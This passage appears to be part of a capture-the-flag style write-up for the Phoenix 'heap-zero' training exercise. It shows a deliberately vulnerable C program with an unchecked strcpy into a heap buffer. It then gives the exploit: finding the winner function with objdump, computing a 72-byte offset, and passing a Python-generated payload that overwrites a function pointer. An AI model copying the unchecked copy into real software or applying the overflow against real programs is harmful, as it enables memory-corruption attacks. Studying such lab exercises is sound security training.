      "overwritten\n");
}

int main(int argc, char **argv) {
  struct data *d;
  struct fp *f;

  printf("%s\n", BANNER);

  if (argc < 2) {
    printf("Please specify an argument to copy :-)\n");
    exit(1);
  }

  d = malloc(sizeof(struct data));
  f = malloc(sizeof(struct fp));
  f->fp = nowinner;

  strcpy(d->name, argv[1]);

  printf("data is at %p, fp is at %p, will be calling %p\n", d, f, f->fp);
  fflush(stdout);

  f->fp();

  return 0;
}
```

## Solution

To resolve we just need to calculate the distance between the two pointer and then change the value of the f pointer to the winner function.

First we need to know the address of winner function:

```
objdump -d heap-zero | grep winner
```

Then we calculate the distance between the two pointer using the output of the program, [0xf7e69050 - 0xf7e69008 = 0x48 = 72] the difference will be 72 in decimal (48 in hex)

```
Welcome to phoenix/heap-zero, brought to you by https://exploit.education
data is at 0xf7e69008, fp is at 0xf7e69050, will be calling 0x804884e
```

```
./heap-zero $(python -c 'import struct; print("A"*72+struct.pack("I",0x08048835 ))')
```
